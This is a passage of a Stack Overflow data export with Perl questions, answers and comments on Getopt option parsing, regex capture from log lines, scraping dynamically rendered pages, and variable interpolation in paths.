"https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 7, "last_activity_date": 1615843429, "last_edit_date": 1615843429, "creation_date": 1496518961, "answer_id": 44347918, "question_id": 44346373, "link": "https://stackoverflow.com/questions/44346373/perl-how-to-read-argv-as-hash/44347918#44347918", "title": "Perl, how to read argv as hash?", "body": "<p>Contrary to your claims, you aren't using Getopt::Long. But you should!</p>\n<pre><code>use strict;\nuse warnings qw( all );\nuse feature qw( say );\n\nuse File::Basename qw( basename );\nuse Getopt::Long   qw( );\n\nmy %opts; \n\nsub parse_args {\n   %opts = ();\n   Getopt::Long::Configure(qw( posix_default ));\n   GetOptions(\n      'help|h|?' =&gt; \\&amp;help,\n      'qp:s' =&gt; \\$opts{qp},\n      'pr:s' =&gt; \\$opts{pr},\n      'rp:s' =&gt; \\$opts{rp},\n      'vr:s' =&gt; \\$opts{vr},\n   )\n      or usage();\n}\n\nparse_args();\n</code></pre>\n<p>Using <code>:s</code> instead of <code>=s</code> makes the option's argument optional as requested in the comments.</p>\n<p>Sample helper subs to complete the above:</p>\n<pre><code>sub help {\n   my $prog = basename($0);\n   say &quot;usage: $prog [options]&quot;;\n   say &quot;       $prog --help&quot;;\n   say &quot;&quot;;\n   say &quot;Options:&quot;;\n   say &quot;   --qp path   ...explanation...&quot;;\n   say &quot;   --qp        ...explanation...&quot;;\n   say &quot;   --pr path   ...explanation...&quot;;\n   say &quot;   --pr        ...explanation...&quot;;\n   say &quot;   --rp path   ...explanation...&quot;;\n   say &quot;   --rp        ...explanation...&quot;;\n   say &quot;   --vr path   ...explanation...&quot;;\n   say &quot;   --vr        ...explanation...&quot;;\n   exit(0);\n}\n\nsub usage {\n   my $prog = basename($0);\n   warn(@_) if @_;\n   warn(&quot;Try `$prog --help' for more information\\n&quot;);\n   exit(1);\n}\n</code></pre>\n"}], "owner": {"reputation": 377, "user_id": 5373538, "user_type": "registered", "accept_rate": 60, "profile_image": "https://lh5.googleusercontent.com/-GxkXfmMS09k/AAAAAAAAAAI/AAAAAAAAAVE/5swI3yJ70nE/photo.jpg?sz=128", "display_name": "genesi5", "link": "https://stackoverflow.com/users/5373538/genesi5"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 439, "favorite_count": 1, "accepted_answer_id": 44347918, "answer_count": 2, "score": 2, "last_activity_date": 1615843429, "creation_date": 1496508762, "last_edit_date": 1615835952, "question_id": 44346373, "link": "https://stackoverflow.com/questions/44346373/perl-how-to-read-argv-as-hash", "title": "Perl, how to read argv as hash?", "body": "<p>So, I've read some guides about how to use <code>Getopt::Long</code> and similar libs to work with <code>argv</code> options, and still has no clue how to use it properly because of totally unclear (as for me) documentation and guides.</p>\n<p>I have a script. It has next arguments:\n<code>-qp</code>,\n<code>-pr</code>,\n<code>-rp</code>,\n<code>-vr</code>, and most of them are for filenames.</p>\n<p>Currently I have this use of <code>Getopt::Long</code>, which I find unsuitable because I need to check what is after option every time:</p>\n<pre><code>for(my $i = 0; $i &lt; @ARGV; $i+=2){\n    if ($ARGV[$i] eq &quot;-qp&quot;){\n        unless ($ARGV[$i+1] eq &quot;-vr&quot; or $ARGV[$i+1] eq &quot;-pr&quot; or $ARGV[$i+1] eq &quot;-rp&quot;){\n            $query_params = $ARGV[$i+1];\n        }\n    }\n    elsif ($ARGV[$i] eq &quot;-pr&quot;){\n        unless ($ARGV[$i+1] eq &quot;-qp&quot; or $ARGV[$i+1] eq &quot;-pr&quot; or $ARGV[$i+1] eq &quot;-rp&quot;){\n            $params = $ARGV[$i+1];\n        }\n    }\n    elsif ($ARGV[$i] eq &quot;-vr&quot;){\n        unless ($ARGV[$i+1] eq &quot;-vr&quot; or $ARGV[$i+1] eq &quot;-qp&quot; or $ARGV[$i+1] eq &quot;-rp&quot;){\n            $variables = $ARGV[$i+1];\n        }\n    }\n    elsif ($ARGV[$i] eq &quot;-rp&quot;){\n        unless ($ARGV[$i+1] eq &quot;-qp&quot; or $ARGV[$i+1] eq &quot;-pr&quot; or $ARGV[$i+1] eq &quot;-vr&quot;){\n            $replace = $ARGV[$i+1];\n        }\n    }\n} \n</code></pre>\n<p>Maybe I don't need to use exact <code>Getopt</code> libs for <code>Unix</code>, I need just to pass some <code>args</code> to script. Is there any way to make it more simple and correct?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 35, "user_id": 7513860, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/769e5c0ad9f483bbeef248b60fe47c79?s=128&d=identicon&r=PG&f=1", "display_name": "Harsh", "link": "https://stackoverflow.com/users/7513860/harsh"}, "edited": false, "score": 0, "creation_date": 1496505177, "post_id": 44345794, "comment_id": 75694314, "body": "If we print $final[1]&gt; Only change is it becomes ...Example2_wrk, need to save that in var"}, {"owner": {"reputation": 1523, "user_id": 4204037, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ab78fa882cbf4a03c4fd2a0b92622dc5?s=128&d=identicon&r=PG&f=1", "display_name": "bytepusher", "link": "https://stackoverflow.com/users/4204037/bytepusher"}, "edited": false, "score": 0, "creation_date": 1496505298, "post_id": 44345794, "comment_id": 75694354, "body": "So you have stored all the lines matching &quot;Design:&quot; in the array <code>@final</code>. That is a variable. Job done? The question seems not to capture what you actually are trying to do."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496505936, "post_id": 44345794, "comment_id": 75694558, "body": "So you want to take the path out of the line?"}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1496509943, "post_id": 44345794, "comment_id": 75695764, "body": "Use lexical variables, not bareword filehandles. Barewords are effectively global. They&#39;re not first-class values; you can&#39;t easily store them in variables, pass them to functions, etc. They&#39;re unchecked: The compiler doesn&#39;t provide any typo protection for them. Lexical variables follow normal scoping rules. They even automatically close themselves when they go out of scope."}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1496510034, "post_id": 44345794, "comment_id": 75695795, "body": "Use 3-arg open, not 2-arg open. 2-arg open applies extra parsing to the second argument in order to pick out the open mode and filename. This can lead to problems with user input or if your filename actually starts/ends with whitespace. The 3-argument form of open avoids all of this by just passing the two values (mode, filename) in two separate arguments."}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1496510146, "post_id": 44345794, "comment_id": 75695828, "body": "Include the filename and the failure reason in the error message. As a user, I would find a message like <code>could not open file at whatever.pl line 264</code> unhelpful. You can get the failure reason from <code>$!</code> (corresponds to <code>strerror(errno)</code> in C)."}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1496510215, "post_id": 44345794, "comment_id": 75695852, "body": "Don&#39;t use global variables for no reason. E.g. <code>$line</code> is only used within the loop. There is no reason for it to be a global variable."}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 1, "creation_date": 1496510264, "post_id": 44345794, "comment_id": 75695873, "body": "Always start your Perl files with <code>use strict; use warnings;</code>. This diagnoses many common problems (including detecting typos in variable names at compile time)."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1496510266, "post_id": 44345794, "comment_id": 75695874, "body": "@melpomene you forgot the part where <code>$line is obsolete</code>, or should be used in the head. Oh but then you were not done yet. :)"}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1496510351, "post_id": 44345794, "comment_id": 75695902, "body": "Don&#39;t overwrite <code>$_</code> if you want to store the line in <code>$line</code> anyway. Why assign to <code>$_</code>, then copy to <code>$line</code> if you can just assign to <code>$line</code> in the first place? <code>while (my $line = &lt;$logfh&gt;) {</code>"}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1496510437, "post_id": 44345794, "comment_id": 75695928, "body": "Don&#39;t use <code>grep</code> on a single value. <code>grep</code> filters a list according to a certain predicate, but in this case you just want to either add <code>$line</code> to <code>@final</code> or not. This can be simply written as <code>push @final, $line if $line =~ &#47;Design:&#47;;</code>"}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1496510558, "post_id": 44345794, "comment_id": 75695961, "body": "It looks like you only care about the first element of <code>@final</code>. In that case, why use an array at all? <code>my $final; while (my $line = readline $fh) { chomp $line; if ($line =~ &#47;Design:&#47;) { $final = $line; last; } } print $final, &quot;\\n&quot;;</code>"}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1496510614, "post_id": 44345794, "comment_id": 75695978, "body": "That said, I don&#39;t see what that code has to do with your question. The answer to your question is <code>$var = &quot;Example_wrk&quot;;</code>."}, {"owner": {"reputation": 1523, "user_id": 4204037, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ab78fa882cbf4a03c4fd2a0b92622dc5?s=128&d=identicon&r=PG&f=1", "display_name": "bytepusher", "link": "https://stackoverflow.com/users/4204037/bytepusher"}, "edited": false, "score": 0, "creation_date": 1496513101, "post_id": 44345794, "comment_id": 75696738, "body": "Which relates back to my first comment ... ;)"}], "answers": [{"tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": false, "score": 0, "last_activity_date": 1496515115, "creation_date": 1496515115, "answer_id": 44347348, "question_id": 44345794, "link": "https://stackoverflow.com/questions/44345794/how-to-capture-substring-word-having-a-certain-pattern-from-a-string-in-perl/44347348#44347348", "title": "How to capture substring/word having a certain pattern from a string in perl?", "body": "<p>This is a wild guess. I think what you want is to capture the filename from that line of log file.</p>\n\n<pre><code>use strict;\nuse warnings;\n\nmy @final;\nopen my $fh, '&lt;', 'sim_success.log' or die \"could not open file: $!\";\nwhile (my $line = &lt;$fh&gt;) {\n    chomp $line;\n    if ( $line =~ m/Design: (.+)$/ ) { \n        push @final, $1;\n    }\n}\nprint $final[0]; # will print only the first one\nclose $fh;\n</code></pre>\n\n<p>Let's see what I did. A lot of this has been explained in melpomene's comments on the question already. I'll reiterate some of them.</p>\n\n<ul>\n<li>always <code>use strict</code> and <code>use warnings</code>! They help you to spot errors.</li>\n<li><code>grep</code> does not do what you think. It's for finding things in a list that match a condition. Your list only had one item. The line.</li>\n<li>you can use the <code>m//</code> operator directly.</li>\n<li>but you need a capture group <code>()</code>, that captures everything</li>\n<li>and the captured stuff will be in <code>$1</code>, which we can <code>push</code> to the array</li>\n</ul>\n\n<p>When the program is done, the array <code>@final</code> might contain one or more matches. If more than one line matches, there are more entries in the array.</p>\n"}], "owner": {"reputation": 35, "user_id": 7513860, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/769e5c0ad9f483bbeef248b60fe47c79?s=128&d=identicon&r=PG&f=1", "display_name": "Harsh", "link": "https://stackoverflow.com/users/7513860/harsh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 28, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1496515115, "creation_date": 1496505108, "question_id": 44345794, "link": "https://stackoverflow.com/questions/44345794/how-to-capture-substring-word-having-a-certain-pattern-from-a-string-in-perl", "title": "How to capture substring/word having a certain pattern from a string in perl?", "body": "<pre><code>open(LOGFILE,\"&lt;sim_success.log\") or die(\"could not open file\");\nwhile (&lt;LOGFILE&gt;){\n$line = $_;\nchomp($line);\nmy @design = grep (/Design:/, $line);\npush (@final, @design);\n}\nprint $final[0];\n\nclose LOGFILE;\n</code></pre>\n\n<blockquote>\n  <p>Design: D:\\Test\\Example\\Example1_wrk....</p>\n</blockquote>\n\n<p>How to save \"Example_wrk\" in a var in perl?</p>\n"}, {"tags": ["html", "perl", "web-scraping", "phantomjs"], "comments": [{"owner": {"reputation": 402, "user_id": 6458608, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M5X40.jpg?s=128&g=1", "display_name": "Matthias Gwiozda", "link": "https://stackoverflow.com/users/6458608/matthias-gwiozda"}, "edited": false, "score": 1, "creation_date": 1496502859, "post_id": 44345176, "comment_id": 75693520, "body": "I quess the problem is that perl and phantom.js are getting the html code properly. If the JS - Code is generating some content then your perl and phantom.js are not able to show it. The Content is then generated through the JavaScript, which is not executed by your perl-Script"}, {"owner": {"reputation": 402, "user_id": 6458608, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M5X40.jpg?s=128&g=1", "display_name": "Matthias Gwiozda", "link": "https://stackoverflow.com/users/6458608/matthias-gwiozda"}, "edited": false, "score": 1, "creation_date": 1496503224, "post_id": 44345176, "comment_id": 75693634, "body": "Try to have a look on this node module: <a href=\"https://github.com/s0ph1e/node-website-scraper-phantom\" rel=\"nofollow noreferrer\">github.com/s0ph1e/node-website-scraper-phantom</a>  the documentation says, that its able to download dynamicly generated content. It is an &quot;extension&quot; for this node-module: <a href=\"https://github.com/s0ph1e/node-website-scraper\" rel=\"nofollow noreferrer\">github.com/s0ph1e/node-website-scraper</a>"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 2, "creation_date": 1496503307, "post_id": 44345176, "comment_id": 75693665, "body": "In Perl you can use WWW::Mechanize::Firefox to remote-control a Firefox window on your computer. It&#39;s a bit like Selenium, where it will click around in the window for you automatically, and you&#39;ll be able take out parts or the full DOM."}, {"owner": {"reputation": 31, "user_id": 7571955, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e3e20b7a0ed78a19e22b1f91259d100c?s=128&d=identicon&r=PG&f=1", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7571955/adrian"}, "reply_to_user": {"reputation": 402, "user_id": 6458608, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M5X40.jpg?s=128&g=1", "display_name": "Matthias Gwiozda", "link": "https://stackoverflow.com/users/6458608/matthias-gwiozda"}, "edited": false, "score": 0, "creation_date": 1496505812, "post_id": 44345176, "comment_id": 75694509, "body": "@MatthiasGwiozda Now that you say it, it seems fair-enough that this is the scenario."}, {"owner": {"reputation": 31, "user_id": 7571955, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e3e20b7a0ed78a19e22b1f91259d100c?s=128&d=identicon&r=PG&f=1", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7571955/adrian"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496505856, "post_id": 44345176, "comment_id": 75694526, "body": "@simbabque I&#39;ll take a look first at your suggestion because I am more familiar with Perl"}], "owner": {"reputation": 31, "user_id": 7571955, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e3e20b7a0ed78a19e22b1f91259d100c?s=128&d=identicon&r=PG&f=1", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7571955/adrian"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 376, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1496502316, "creation_date": 1496501535, "last_edit_date": 1496502316, "question_id": 44345176, "link": "https://stackoverflow.com/questions/44345176/get-generated-web-page-source", "title": "Get generated web page source", "body": "<p>I want to scrap a betting page results. The web page is dinamically generated and has some javascript running behind(at least that's what I deduced from the source code). So far I tried to get the content of the web page with Perl (wget) </p>\n\n<pre><code>use strict;\nuse warnings;\n\nmy $url = 'https://superbet.ro/pariuri-sportive';\n\nmy $html = qx{wget --quiet --output-document=\"C:/Users/Cristi/Desktop/web.html\" $url};\n</code></pre>\n\n<p>But that didn't work out (  the output is the same with the output that I get if I right click in browser -> View page source).</p>\n\n<p>Then I tried with phantomJs:</p>\n\n<pre><code>var page = require('webpage').create();\npage.open('https://www.superbet.ro/pariuri-sportive', function (status) {\n    console.log(\"status: \" + status);\n    if (status !== \"success\") {\n      console.log(\"Unable to access network\");\n    } else {\n    window.setTimeout(function() {\n        var fs = require('fs');\n        try {\n            fs.write(\"C:/Users/Cristi/Desktop/output.html\", page.content, 'w');\n        } catch(e) {\n            console.log(e);\n        }\n    }, 10000); // adjust time for every page        }\n});\n</code></pre>\n\n<p>The same results.</p>\n\n<p>Then I tried to install <code>Web developer</code> in firefox and accesed the generated content with right-click->Web developer->view source->view generated source. This output is actually what I am trying to get. But instead doing it manually I'd like to do it in an automatic way.</p>\n\n<p>What am I doing wrong in Perl or in the phantomJs approach? Is there a way I could get a command for the <code>Web developer</code> add-on to get the generated source code from a script or a batch file?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 31, "user_id": 8104407, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f4a10c1591e69fe6d10a6f16b89b3c8a?s=128&d=identicon&r=PG&f=1", "display_name": "mahesh", "link": "https://stackoverflow.com/users/8104407/mahesh"}, "edited": false, "score": 0, "creation_date": 1496500020, "post_id": 44344939, "comment_id": 75692691, "body": "i have tried like"}, {"owner": {"reputation": 31, "user_id": 8104407, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f4a10c1591e69fe6d10a6f16b89b3c8a?s=128&d=identicon&r=PG&f=1", "display_name": "mahesh", "link": "https://stackoverflow.com/users/8104407/mahesh"}, "edited": false, "score": 0, "creation_date": 1496500034, "post_id": 44344939, "comment_id": 75692697, "body": "use Getopt::Std;   my %opts=();   getopts(&#39;a:v:l: \\%opts);     my $application = $opts{a};  my $version = $opts{v};  my $location = $opts{l};     if($application eq &#39;abc&#39;)   {   chdir &#39;/var/tmp/dst_$application/$version/$location&#39;; }"}, {"owner": {"reputation": 31, "user_id": 8104407, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f4a10c1591e69fe6d10a6f16b89b3c8a?s=128&d=identicon&r=PG&f=1", "display_name": "mahesh", "link": "https://stackoverflow.com/users/8104407/mahesh"}, "edited": false, "score": 0, "creation_date": 1496500065, "post_id": 44344939, "comment_id": 75692704, "body": "i am getting exception near dst_$application as concentation error"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 5, "creation_date": 1496500448, "post_id": 44344939, "comment_id": 75692823, "body": "Please <a href=\"https://stackoverflow.com/posts/44344939/edit\">edit</a> your question to include the stuff you&#39;ve tried."}], "answers": [{"comments": [{"owner": {"reputation": 31, "user_id": 8104407, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f4a10c1591e69fe6d10a6f16b89b3c8a?s=128&d=identicon&r=PG&f=1", "display_name": "mahesh", "link": "https://stackoverflow.com/users/8104407/mahesh"}, "edited": false, "score": 0, "creation_date": 1496588556, "post_id": 44345033, "comment_id": 75712873, "body": "i have tried double quotes but the values are not getting replaced in the script, Those variables I am updating from command line arguments"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 31, "user_id": 8104407, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f4a10c1591e69fe6d10a6f16b89b3c8a?s=128&d=identicon&r=PG&f=1", "display_name": "mahesh", "link": "https://stackoverflow.com/users/8104407/mahesh"}, "edited": false, "score": 0, "creation_date": 1496590492, "post_id": 44345033, "comment_id": 75713455, "body": "@mahesh please update your question with the code you have now."}, {"owner": {"reputation": 31, "user_id": 8104407, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f4a10c1591e69fe6d10a6f16b89b3c8a?s=128&d=identicon&r=PG&f=1", "display_name": "mahesh", "link": "https://stackoverflow.com/users/8104407/mahesh"}, "edited": false, "score": 0, "creation_date": 1496637334, "post_id": 44345033, "comment_id": 75725134, "body": "use strict;       4 use warnings;       5       6 use Getopt::Std;       7       8 my %opts=();       9    getopts(&#39;a:v:l:&#39;, \\%opts);      10 my $application = $opts{a};      11 my $version = $opts{v};      12 my $location = $opts{l};      13      14 print &quot;$application, $version, $location\\n&quot;;      15      16 if($application eq &#39;abc&#39;)      17      18 {      19 #print &quot;you came here\\n&quot;;      20 chdir &quot;/viewstore/ccwww/dst_$application_$version/abc/$location&quot;;      21 print &quot;you came here\\n&quot;;      22 }"}, {"owner": {"reputation": 31, "user_id": 8104407, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f4a10c1591e69fe6d10a6f16b89b3c8a?s=128&d=identicon&r=PG&f=1", "display_name": "mahesh", "link": "https://stackoverflow.com/users/8104407/mahesh"}, "edited": false, "score": 0, "creation_date": 1496637381, "post_id": 44345033, "comment_id": 75725148, "body": "Global symbol &quot;$application_&quot; requires explicit package name at ./test.pl line 20. Execution of ./test.pl aborted due to compilation errors."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 31, "user_id": 8104407, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f4a10c1591e69fe6d10a6f16b89b3c8a?s=128&d=identicon&r=PG&f=1", "display_name": "mahesh", "link": "https://stackoverflow.com/users/8104407/mahesh"}, "edited": false, "score": 0, "creation_date": 1496644732, "post_id": 44345033, "comment_id": 75727595, "body": "@mahesh you made a lot of effort to put the line numbers there. Why don&#39;t you just edit your question?!"}, {"owner": {"reputation": 31, "user_id": 8104407, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f4a10c1591e69fe6d10a6f16b89b3c8a?s=128&d=identicon&r=PG&f=1", "display_name": "mahesh", "link": "https://stackoverflow.com/users/8104407/mahesh"}, "edited": false, "score": 0, "creation_date": 1496652875, "post_id": 44345033, "comment_id": 75731660, "body": "use strict; use warnings; use Cwd &#39;chdir&#39;;  use Getopt::Std;  my %opts=();    getopts(&#39;a:v:l:&#39;, \\%opts); my $application = $opts{a}; my $version = $opts{v}; my $location = $opts{l};  print &quot;$application, $version, $location\\n&quot;;  if($application eq &#39;abc&#39;) { #print &quot;you came here\\n&quot;; chdir &quot;/viewstore/ccwww/dst_$application_$version/abc/$location&quot;; print $ENV{PWD}; }"}, {"owner": {"reputation": 31, "user_id": 8104407, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f4a10c1591e69fe6d10a6f16b89b3c8a?s=128&d=identicon&r=PG&f=1", "display_name": "mahesh", "link": "https://stackoverflow.com/users/8104407/mahesh"}, "edited": false, "score": 0, "creation_date": 1496652916, "post_id": 44345033, "comment_id": 75731677, "body": "i tried to add the same in question, but some how stackoverflow was not accepting my question"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 31, "user_id": 8104407, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f4a10c1591e69fe6d10a6f16b89b3c8a?s=128&d=identicon&r=PG&f=1", "display_name": "mahesh", "link": "https://stackoverflow.com/users/8104407/mahesh"}, "edited": false, "score": 0, "creation_date": 1496653301, "post_id": 44345033, "comment_id": 75731877, "body": "@mahesh Stack Overflow does not allow you to post additional questions because this question was so badly received. You don&#39;t need to add a new question. You need to EDIT the existing one. I posted a comment on the question with a link to the edit form. You can read all about editing [<a href=\"https://meta.stackexchange.com/a/21789/202151](here)\">meta.stackexchange.com/a/21789/202151](here)</a>. However, I&#39;ve updated my answer and included the solution already. If that solves your problem, please read <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a> and then mark an answer as accepted. That will also help lift your question ban. Thank you."}, {"owner": {"reputation": 31, "user_id": 8104407, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f4a10c1591e69fe6d10a6f16b89b3c8a?s=128&d=identicon&r=PG&f=1", "display_name": "mahesh", "link": "https://stackoverflow.com/users/8104407/mahesh"}, "edited": false, "score": 0, "creation_date": 1496654162, "post_id": 44345033, "comment_id": 75732338, "body": "thanks for prompt response, But when i try to edit the question i am getting exception you code not properly formatted. I have tried all the ways to post my code. I am unable to Find your solutions"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 31, "user_id": 8104407, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f4a10c1591e69fe6d10a6f16b89b3c8a?s=128&d=identicon&r=PG&f=1", "display_name": "mahesh", "link": "https://stackoverflow.com/users/8104407/mahesh"}, "edited": false, "score": 0, "creation_date": 1496654881, "post_id": 44345033, "comment_id": 75732741, "body": "@mahesh I&#39;ve edited your question for you. Look at how I did the formatting to see what you did wrong. You need to do use <code>&quot;dst_${application}_${version}</code>."}, {"owner": {"reputation": 31, "user_id": 8104407, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f4a10c1591e69fe6d10a6f16b89b3c8a?s=128&d=identicon&r=PG&f=1", "display_name": "mahesh", "link": "https://stackoverflow.com/users/8104407/mahesh"}, "edited": false, "score": 0, "creation_date": 1496655602, "post_id": 44345033, "comment_id": 75733121, "body": "Thanks a ton i got it, I have another question when we are using chdir in the perl script after running the command I am returning to the current location where i am running the script. How to stay in the change directory"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 31, "user_id": 8104407, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f4a10c1591e69fe6d10a6f16b89b3c8a?s=128&d=identicon&r=PG&f=1", "display_name": "mahesh", "link": "https://stackoverflow.com/users/8104407/mahesh"}, "edited": false, "score": 0, "creation_date": 1496656403, "post_id": 44345033, "comment_id": 75733570, "body": 